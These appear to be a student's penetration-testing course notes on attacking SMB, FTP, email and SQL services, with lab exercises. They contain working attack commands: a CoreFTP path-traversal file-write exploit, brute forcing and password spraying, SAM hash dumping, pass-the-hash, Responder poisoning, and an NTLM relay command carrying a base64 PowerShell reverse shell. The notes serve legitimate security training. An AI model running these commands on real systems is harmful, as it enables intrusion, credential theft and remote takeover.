\\Interacting with COmmon Services
Vulnerabilities are commonly discovered by people who use and understand technology, a protocol, or a service. As we evolve in this field, we will find different services to interact with, and we will need to evolve and learn new technology constantly.

To be successful at attacking a service, we need to know its purpose, how to interact with it, what tools we can use, and what we can do with it. This section will focus on common services and how we can interact with them.
\\File Share Services
\\Server Message Block (SMB)
\\Windows \\192.168.1.1\share
Windows has two command-line shells: the Command shell and PowerShell. Each shell is a software program that provides direct communication between us and the operating system or application, providing an environment to automate IT operations.
\\Windows CMC-Director
The command net use connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter n.
\\Window CMD - Net use
$>net use n: \\192.168.1.1\share
$>net use n: \\192.168.1.1\share /user:plaintext Password123
With the shared folder mapped as the n drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
\\Window CMD - Dir 
$dir n: /a-d /s /b | find /c ":\"
Syntax	Description
dir	Application
n:	Directory or drive to search
/a-d	/a is the attribute and -d means not directories
/s	Displays files in a specified directory and all subdirectories
/b	Uses bare format (no heading information or summary)
$dir n:\*cred* /s /b 
n:\Contracts\private\credentials/txt
$dir n:\*secret* /s /b n:\Contracts\private\secret.txt
-If we want to search for a specific word within a text file, we can use findstr.
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr

\\Windows CMD - Findstr
$findstr /s /i cred n:\*.*

\\Windows Powershell
PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called cmdlets. 
-Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets. Let's replicate the same commands now using Powershell.

\\Windows PowerShell 
$Get-ChildItem \\192.168.1.1\Share\
-instead of net use we can use New-PSDrive in PowerShell
$New-PSDrive -Name "N" -Root "\\192.168.1.1\share" -PSProvider "FileSystem"
To provide a username and password with Powershell, we need to create a PSCredential object. It offers a centralized way to manage usernames, passwords, and credentials.
https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.4.0

\\Windows PowerShell - PSCredential Object
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
$New-PSDrive -Name "N" -Root "\\192.168.1.1\share" -PSProvider "FileSystem" - Credential $cred
We can use the property -Include to find specific items from the directory specified by the Path parameter.

$Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
-The Select-String cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use Select-String similar to grep in UNIX or findstr.exe in Windows.

\\Windows PowerShell - Select-String
$Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -list
CLI enables IT operations to automate routine tasks like user account management, nightly backups, or interaction with many files. We can perform operations more efficiently by using scripts than the user interface or GUI.

\\Linux
Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let's cover how to mount SMB shares to interact with directories and files locally.

\\Linux-Mount
$sudo mkdir /mnt/Finance
$sudo mkdir /mount -t cifs -o username=plaintext,password=Password123,domain=.//192.168.1.1/finance /mnt/Finance
<alternative>
$mount -t cifs //192.168.1.1/Finance /mnt/Finance -o credentials=/path/credentialsfile
CredentialFile
Code: txt
username=plaintext
password=Password123
domain=.
Note: We need to install cifs-utils to connect to an SMB share folder. To install it we can execute from the command line sudo apt install cifs-utils.
-Once a shared folder is mounted, you can use common Linux tools such as find or grep to interact with the file structure. Let's hunt for a filename that contains the string cred:
\\Linux-Find
$find /mnt/Finance/ -name *cred*
$grep -rn /mnt/Finance/ -ie cred
\\Other service
FTP,TFTP,NFS that we can attach (mount) 
There are other file-sharing services such as FTP, TFTP, and NFS that we can attach (mount) using different tools and commands. However, once we mount a file-sharing service, we must understand that we can use the available tools in Linux or Windows to interact with files and directories. As we discover new file-sharing services, we will need to investigate how they work and what tools we can use to interact with them.

\\email 
SMNP delivery email through internet 
likewise protocol must be retrive an email from a service, POP3 and IMAP
We can use a mail client such as Evolution, the official personal information manager, and mail client for the GNOME Desktop Environment. We can interact with an email server to send or receive messages with a mail client. To install Evolution, we can use the following command:

\\Linux Install Evolution
$sudo apt-get install Evolution
Note: If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution export WEBKIT_FORCE_SANDBOX=0 && evolution.

\\Video - Connecting to IMAP and SMTP using Evolution
We can use the domain name or IP address of the mail server. If the server uses SMTPS or IMAPS, we'll need the appropriate encryption method (TLS on a dedicated port or STARTTLS after connecting). We can use the Check for Supported Types option under authentication to confirm if the server supports our selected method.

\\\Databases
Databases are typically used in enterprises, and most companies use them to store and manage information. There are different types of databases, such as Hierarchical databases, NoSQL (or non-relational) databases, and SQL relational databases. We will focus on SQL relational databases and the two most common relational databases called MySQL & MSSQL. We have three common ways to interact with databases:
1.	Command Line Utilities (mysql or sqsh)
2.	Programming Languages
3.	A GUI application to interact with databases such as HeidiSQL, MySQL Workbench, or SQL Server Management Studio.
\\Command Line Utilities
To interact with MSSQL (Microsoft SQL Server) with Linux we can use sqsh or sqlcmd if you are using Windows. Sqsh is much more than a friendly prompt. It is intended to provide much of the functionality provided by a command shell, such as variables, aliasing, redirection, pipes, back-grounding, job control, history, command substitution, and dynamic configuration. We can start an interactive SQL session as follows:

\\Linux - SQSH 
$sqsh -S 10.129.20.13 -U username -P Password123
The sqlcmd utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:
At the command prompt.
In Query Editor in SQLCMD mode.
In a Windows script file.
In an operating system (Cmd.exe) job step of a SQL Server Agent job.

\\Window -SQL CMD
$>sqlcmd -S 10.129.20.23 -U username -P password

\\MySQL 
To interact with MySQL, we can use MySQL binaries for Linux (mysql) or Windows (mysql.exe). MySQL comes pre-installed on some Linux distributions, but we can install MySQL binaries for Linux or Windows using this guide. Start an interactive SQL Session using Linux:
\\Linux Mysql
[!bash!]$ mysql -u username -pPassword123 -h 10.129.20.13
GUI Application
To install dbeaver using a Debian package we can download the release .deb package from https://github.com/dbeaver/dbeaver/releases and execute the following command:
Install dbeaver
[!bash!]$ sudo dpkg -i dbeaver-<version>.deb
Run dbeaver
[!bash!]$ dbeaver &
To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).

\\Tools
Tools to Interact with Common Services
SMB	FTP	Email	Databases
smbclient	ftp	Thunderbird	mssql-cli
CrackMapExec	lftp	Claws	mycli
SMBMap	ncftp	Geary	mssqlclient.py
Impacket	filezilla	MailSpring	dbeaver
psexec.py	crossftp	mutt	MySQL Workbench
smbexec.py		mailutils	SQL Server Management Studio or SSMS
sendEmail	
swaks	
sendmail

General TroubleshootingSome reasons why we may not have access to a resource:

Authentication
Privileges
Network Connection
Firewall Rules
Protocol Support

\\The Concept of Attacks
Source --> process --> privileges --> Destination
The concept is based on four categories that occur for each vulnerability. First, we have a Source that performs the specific request to a Process where the vulnerability gets triggered. Each process has a specific set of Privileges with which it is executed. Each process has a task with a specific goal or Destination to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.
\\Source
We can generalize Source as a source of information used for the specific task of a process
code , Libraries, Config , APIs, User input
\Log4j CVE-2021-44228 which was published at the end of 2021
\\process
The Process is about processing the information forwarded from the source. 
PID, Input, Data processing, Variables, logging
\\Log4j 
The process of Log4j is to log the User-Agent as a string using a function and store it in the designated location. T

\\Privileges
Privileges are present in any system that controls processes. These serve as a type of permission that determines what tasks and actions can be performed on the system. In simple terms, it can be compared to a bus ticket. 
-What made the Log4j vulnerability so dangerous was the Privileges that the implementation brought. Logs are often considered sensitive because they can contain data about the service, the system itself, or even customers
system, user, groups, policies, Rule
\\Destination
Every task has at least one purpose and goal that must be fulfilled. Logically, if any data set changes were missing or not stored or forwarded anywhere, the task would be generally unnecessary.
local, Network

The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the Destination in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (RCE) vulnerability.
Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/

Initiation of the Attack
Step	Log4j	Concept of Attacks - Category
1.	The attacker manipulates the user agent with a JNDI lookup command.	Source
2.	The process misinterprets the assigned user agent, leading to the execution of the command.	Process
3.	The JNDI lookup command is executed with administrator privileges due to logging permissions.	Privileges
4.	This JNDI lookup command points to the server created and prepared by the attacker, which contains a malicious Java class containing commands designed by the attacker.	Destination

Trigger Remote Code Execution
Step	Log4j	Concept of Attacks - Category
5.	After the malicious Java class is retrieved from the attacker's server, it is used as a source for further actions in the following process.	Source
6.	Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system.	Process
7.	The malicious code is executed with administrator privileges due to logging permissions.	Privileges
8.	The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely.	Destination

\\===========================================
Service Misconfigurations
\\Authentication
-Anonymous Authentication
-Misconfigured Access Right
Administrators need to plan their access rights strategy, and there are some alternatives such as Role-based access control (RBAC), Access control lists (ACL). If we want more detailed pros and cons of each method, we can read Choosing the best access control strategy by Warren Parad from Authress.
-Unnecessary Defaults
Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).
Default accounts and their passwords are still enabled and unchanged.
Error handling reveals stack traces or other overly informative error messages to users.
For upgraded systems, the latest security features are disabled or not configured securely.
\\Preventing Misconfiguration 
Admin interfaces should be disabled.
Debugging is turned off.
Disable the use of default usernames and passwords.
Set up the server to prevent unauthorized access, directory listing, and other issues.
Run scans and audits regularly to help discover future misconfigurations or missing fixes.

-The OWASP Top 10 provides a section on how to secure the installation processes:

A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. In addition, this process should be automated to minimize the effort required to set up a new secure environment.

A minimal platform without unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.

A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process (see A06:2021-Vulnerable and Outdated Components). Review cloud storage permissions (e.g., S3 bucket permissions).

A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).

Sending security directives to clients, e.g., security headers.

An automated process to verify the effectiveness of the configurations and settings in all environments.

\\\\\==========================================
Finding Sensitive information
When attacking a service, we usually play a detective role, and we need to collect as much information as possible and carefully observe the details. Therefore, every single piece of information is essential.

\\\\\======================================
Attacking FTP
The File Transfer Protocol (FTP) is a standard network protocol used to transfer files between computers. It also performs directory and files operations, such as changing the working directory, listing files, and renaming and deleting directories or files. By default, FTP listens on port TCP/21.
To attack an FTP Server, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities.
\\Enumeration
$sudo nmap -sC -sV -p 21 192.168.2.142
-sC nmap scrip -sV version enum banner m,,
\\Misconfigurations
 To access with anonymous login, we can use the anonymous username and no password. 
\\Anonymous Authentication
$ftp 192.168.2.142
ls cd get mget, upload put mput 
\\Protocol Specifics Attacks
Many different attacks and methods are protocol-based. However, it is essential to note that we are not attacking the individual protocols themselves but the services that use them. Since there are dozens of services for a single protocol and they process the corresponding information differently, we will look at some.
\\Bruteforcing 
Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.
$medusa -u <username> -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
\\FTP Bounce Attack
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.
-Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.
 https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/
 $nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
 -b can be used to perform an FTP bounce aattack

 <test>
hydra -t 45 -L users.list -P passwords.list ssh://<ip> -q 
\\Lastest FTP vulnerabilities
In this case, we will discuss the CoreFTP before build 727 vulnerability assigned CVE-2022-22836. This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.
\\The Concept of the Attack
This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. Let's have a look at the attack based on our concept. The exploit for this attack is relatively straightforward, based on a single cURL command.
https://www.exploit-db.com/exploits/50652

\\CoreFTP Exploitation
$curl -k -X PUT -H "Host: <ip>" --basic -u <username>:<password> --data-binary "Poc." --path-as-is https://<IP>/../../../../../../whoops
We create a raw HTTP PUT request (-X PUT) with basic auth (--basic -u <username>:<password>), the path for the file (--path-as-is https://<IP>/../../../../../whoops), and its content (--data-binary "PoC.") with this command. Additionally, we specify the host header (-H "Host: <IP>") with the IP address of our target system.
\\The Concept of Attacks
In short, the actual process misinterprets the user's input of the path. This leads to access to the restricted folder being bypassed. As a result, the write permissions on the HTTP PUT request are not adequately controlled, which leads to us being able to create the files we want outside of the authorized folders. However, we will skip the explanation of the Basic Auth process and jump directly to the first part of the exploit.

Directory Traversal
Step	Directory Traversal	Concept of Attacks - Category
1.	The user specifies the type of HTTP request with the file's content, including escaping characters to break out of the restricted area.	Source
2.	The changed type of HTTP request, file contents, and path entered by the user are taken over and processed by the process.	Process
3.	The application checks whether the user is authorized to be in the specified path. Since the restrictions only apply to a specific folder, all permissions granted to it are bypassed as it breaks out of that folder using the directory traversal.	Privileges
4.	The destination is another process that has the task of writing the specified contents of the user on the local system.	Destination

Up to this point, we have bypassed the constraints imposed by the application using the escape characters (../../../../) and come to the second part, where the process writes the contents we specify to a file of our choice. This is when the cycle starts all over again, but this time to write contents to the target system.

Arbitrary File Write
Step	Arbitrary File Write	Concept of Attacks - Category
5.	The same information that the user entered is used as the source. In this case, the filename (whoops) and the contents (--data-binary "PoC.").	Source
6.	The process takes the specified information and proceeds to write the desired content to the specified file.	Process
7.	Since all restrictions were bypassed during the directory traversal vulnerability, the service approves writing the contents to the specified file.	Privileges
8.	The filename specified by the user (whoops) with the desired content ("PoC.") now serves as the destination on the local system.	Destination

\\Attacking SMB
MB is a protocol for sharing files and printers over networks. It uses port 445 (direct TCP/IP) or 139 
(via NetBIOS). Samba is the Linux/Unix open-source version enabling SMB sharing with Windows.
-MSRPC (Microsoft RPC) lets programs call functions remotely; MS-RPCE defines RPC-over-SMB using SMB named pipes.
Attacking SMB requires knowing the server/OS and tools; common paths are misconfiguration, excessive privileges, and vulnerabilities.
After access, inspect shared folders and enumerate NetBIOS/RPC info (shares, pipes, privileges).

\\Enumeration
Nmap output varies by SMB implementation and OS — Windows often won’t show exact version (Nmap only guesses). You’ll usually need additional scans to confirm vulnerabilities; for now scan TCP ports 139 and 445 (example: nmap -sV -p 139,445 <target>).
$sudo nmap 10.129.14.128 -sV -sC -P139,445
-The Nmap scan reveals essential information about the target:
SMB version (Samba smbd 4.6.2)
Hostname HTB
Operating System is Linux based on SMB implementation
-Let's explore some common misconfigurations and protocols specifics attacks.
\\Misconfigurations
SMB can be configured not to require authentication, which is often called a null session. Instead, we can log in to a system with no username or password.

\\Anonymous Authentication
If an SMB server allows anonymous access or we have valid creds, we can enumerate shares, users, groups, permissions, policies, and services.
 Tools that support null sessions include smbclient, smbmap, rpcclient, and enum4linux. Next: interact with file shares and RPC using null authentication.

\\File Share
Using smbclient, we can display a list of the server's shares with the option -L, and using the option -N, we tell smbclient to use the null session.
$smbclient -N -L //10.129.14.128

Smbmap is another tool that helps us enumerate network shares and access associated permissions. An advantage of smbmap is that it provides a list of permissions for each shared folder.
$smbmap -H 10.129.14.128
$smbmap -r or -R (recursive) option, 
$smbmap -H 10.129.14.128 -r notes
The permis are set to READ and Write which one can use to upload and download the files
$smbmap -H 10.129.14.128 --download "note\note.txt"
$smbmap -H 10.129.14.128 --upload test.txt "note\test.txt"

\\Remote Procedure call (RPC)
We can use the rpcclient tool with a null session to enumerate a workstation or Domain Controller.
The rpcclient tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this cheat sheet from the SANS Institute or review the complete list of all these functions found on the man page of the rpcclient.
https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf
https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
$rpcclient -U'%' 10.129.110.17
>enumdomousers
-Enum4linux is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets such as:
Workgroup/Domain name
Users information
Operating system information
Groups information
Shares Folders
Password policy information
-the origin tool was written in perl and rewritten by Mark love in python2
https://github.com/CiscoCXSecurity/enum4linux
https://github.com/cddmp/enum4linux-ng
$./enum4linux-ng.py 10.10.11.45 -A -C 

<test>"What is the name of the shared folder with READ and WRITE permissions?"
enum4linux <ip>
<test>"What is the password for the username "jason"?"
msfconsole -q
use auxiliary/scanner/smb/smb_login
set rhosts STMIP
set SMBUSER jason
set PASS_FILE ./pws.list
set stop_on_success true
run
jason:34c8zuNBo91!@28Bszh'
<test>"Login as the user "jason" via SSH and find the flag.txt. Submit the contents as the answer."
smbclient -U jason //ip/GGJ
get id_rsa
exit 
chmod 600 
ssh -i id_rsa jason@ip 
cat flag.txt 

\\\\\\\\\\\==============================
Lastest SMB Vulnerabilities
SMBGHOST with the CVE 2020-0796 vul smb3.1.1 target windows 10 1903 1909 RCE

Concept of attack
Initiation of the Attack
Step	SMBGhost	Concept of Attacks - Category
1.	The client sends a request manipulated by the attacker to the SMB server.	Source
2.	The sent compressed packets are processed according to the negotiated protocol responses.	Process
3.	This process is performed with the system's privileges or at least with the privileges of an administrator.	Privileges
4.	The local process is used as the destination, which should process these compressed packets.	Destination
Trigger Remote Code Execution
Step	SMBGhost	Concept of Attacks - Category
5.	The sources used in the second cycle are from the previous process.	Source
6.	In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker's instructions and forcing the CPU to execute those instructions.	Process
7.	The same privileges of the SMB server are used.	Privileges
8.	The remote attacker system is used as the destination, in this case, granting access to the local system.	Destination
However, despite the vulnerability's complexity due to the buffer's manipulation, which we can see in the PoC, the concept of the attack nevertheless applies here.



\\Protocol Specifics Attacks\
If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are brute forcing and password spraying.
\
\\Brute Forcing and Password Spray
Brute-force tries many passwords for one account but risks lockouts — avoid it unless you know the lockout threshold.
Password spraying is safer: try a common password across many usernames (2–3 guesses per account is typical), wait ~30–60 minutes between rounds.
CrackMapExec supports spraying: e.g. cme smb <target> -u users.txt -p 'Password1' (tries Password1 for every user in users.txt).
$crackmapexec smb 10.l0.110.17 -u /tmp/usrlist.txt -p 'Company01!' --local-auth
 we can use the option -u to specify a file with a user list and -p to specify a password. This will attempt to authenticate every user from the list using the provided password.
 By default CME stops after a successful login; add --continue-on-success to keep spraying the same password across the list.
For non-domain (local) targets use --local-auth.
Example: cme smb <target> -u users.txt -p 'Password1' --continue-on-success
For deeper study, see the Active Directory Enumeration & Attacks module.
\\SMB
Linux SMB mainly exposes filesystem-level attacks and privilege abuse, while Windows SMB has a larger attack surface.
On Windows, what you can do depends on the compromised account’s privileges — with admin-level access you can run remote commands, extract SAM hashes, enumerate logged-on users, and perform Pass-the-Hash.
We’ll cover techniques to perform these actions and how SMB can be abused to retrieve user hashes for escalation.

\\Remote Code Execution (RCE)
PsExec is a Sysinternals tool for running interactive processes on remote Windows machines: it copies a service to the admin$ share, uses DCE/RPC over SMB to talk to the Service Control Manager, starts the service, and opens a named pipe to send commands. You can download PsExec from Microsoft or use Linux equivalents.
-Impacket PsExec - Python PsExec like functionality example using RemComSvc.
Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
CrackMapExec - includes an implementation of smbexec and atexec.
Metasploit PsExec - Ruby PsExec implementation.

\\Impacket PsExec
To use impacket-psexec, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:
$impacket-psexec -h 
To connect to a remote machine with a local administrator account, using impacket-psexec, you can use the following command:
$impacket-psexec administrator:'Password123!'@10.10.110.17
>whoami && hostname 
The same options apply to impacket-smbexec and impacket-atexec.

\\CrackMapExec
CrackMapExec can run commands on multiple hosts at once. Example:
cme smb <targets> -u users.txt -p 'Passw0rd' -x 'whoami' (CMD) or -X 'Get-Process' (PowerShell).
$crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

Note: If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec

\\Enumerating Logged-on Users
Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use CrackMapExec to enumerate logged-on users on all machines within the same network 10.10.110.17/24, which speeds up our enumeration process.
$crackmapexec smb 10.10.110.9/24 -u Administrator -p 'Password123!' --loggedon-users

\\Extract Hashes from SAM database
The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:
Authenticate as another user.
Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
Pass The Hash. We will discuss it later in this section.
$crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam 

\\Pass-the-Hash (PtH)
If you get a user's NTLM hash but can't crack it, you can still authenticate via Pass-the-Hash (PtH) — use the hash with tools like Impacket, smbmap, or CrackMapExec to authenticate over SMB.
$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

\\Forced Authentication Attacks
Use a fake SMB server (Responder) to poison LLMNR/NBT-NS/MDNS and capture NetNTLM v1/v2 hashes — Responder replies for requested hosts and logs the hashes.
$responder -I <interface name>
Windows resolves names by checking (1) hosts file, (2) local DNS cache, (3) configured DNS server, 
and if unresolved, (4) sends a multicast (LLMNR/NetBIOS/MDNS) query. A mistyped share (e.g. \\mysharefoder\) triggers that multicast
 — attackers can spoof replies (no integrity checks) and redirect victims to malicious SMB servers to capture credentials.
$sudo responder -I ens33
-These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.
-All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.
-Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.
$hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
NTLMv2 cracked → password: P@ssword. If uncracked, you can relay the captured hash (e.g., with impacket-ntlmrelayx or Responder MultiRelay); set SMB = Off in Responder.conf first.
$cat /etc/responder/Responder.conf | grep 'SMB='
-Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
$impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
-We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).
$$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
-Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
$nc -lvnp 9001
\\\RPC
In the Footprinting module, we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:

Change a user's password.
Create a new domain user.
Create a new shared folder.
We also cover enumeration using RPC in the Active Directory Enumeration & Attacks module.
Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the rpclient man page or SMB Access from Linux Cheat Sheet from the SANS Institute to explore this further.

\\======================================================
\\Attacking SQL Databases
Enumeration
MSSQL uses ports TCP/1433 and UDP1434 and MySQL uses TCP/3306 in hidden mod MSSQL use TCP/2433 port,
$nmap -Pn -sV -sC -p1433 10.10.10.125
\\Authentication Mechanisms
Authentication Type	Description
Windows authentication mode	This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.
Mixed mode	Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.
-in the past it have CVE-2012-2122 in MySQL 5.6.x servers, allow bypass authen by repeadly using the same incorrect password for the given account because the timing attack vul existed in the way MySQL handled authen attempts
\\Misconfiguration
\\Privileges
Read or change the contents of a database

Read or change the server configuration

Execute commands

Read local files

Communicate with other databases

Capture the local system hash

Impersonate existing users

Gain access to other networks
\\protocol specific attack
It is crucial to understand how SQL syntax works. We can use the free SQL Injection Fundamentals module to introduce ourselves to SQL syntax. Even though this module covers MySQL, MSSQL and MySQL syntax are pretty similar.
\\Read/Change the Databases
First, we need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that we may find databases with hundreds of tables. If our goal is not just getting access to the data, we will need to pick which tables may contain interesting information to continue our attacks, such as usernames and passwords, tokens, configurations, and more. Let's see how we can do this:
\\MySQL - Connecting to the SQL Server
$mysql -u julio -pPassword12 -h 10.129.20.13
\\Sqlcmd - Connecting to the SQL Server
$sqlcmd -S SRVMSSQL -U julio -P 'Mypassword' -y 30 -Y 30
Note: When we authenticate to MSSQL using sqlcmd we can use the parameters -y (SQLCMDMAXVARTYPEWIDTH) and -Y (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
$sqsh -S 10.129.203.7 -U julio -P 'Passwordp' -H
<alter>
$mssqlclient.py -p 1433 julio@10.129.203.7
-Note: When we authenticate to MSSQL using sqsh we can use the parameters -h to disable headers and footers for a cleaner look.
-we can use SERVERNAME\\accountname or .\\accountname. The full command would look like:
$sqsh -S 10.129.203.7 -U .\\julio -P 'Mypassword!' -H

\\SQL Default Databases
Before using SQL, know the default MySQL and MSSQL databases — they store system info (names, tables, columns) and support enumeration, but rarely contain company data.
Note: We will get an error if we try to list or connect to a database we don't have permissions to.
-MySQL default system schemas/databases:
    mysql - is the system database that contains tables that store information required by the MySQL server
information_schema - provides access to database metadata
performance_schema - is a feature for monitoring MySQL Server execution at a low level
sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

-MSSQL default system schemas/databases:

    master - keeps the information for an instance of SQL Server.
msdb - used by SQL Server Agent.
model - a template database copied for each new database.
resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
tempdb - keeps temporary objects for SQL queries.

\\SQL Syntax
Show Databases
mysql>SHOW DATABASES;
If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
$SELECT name FROM master.dbo.sysdatabases
$GO
\\Select a database
mysql>USE htbusers;  >GO
\\Show tables
mysql>SHOW TABLES;
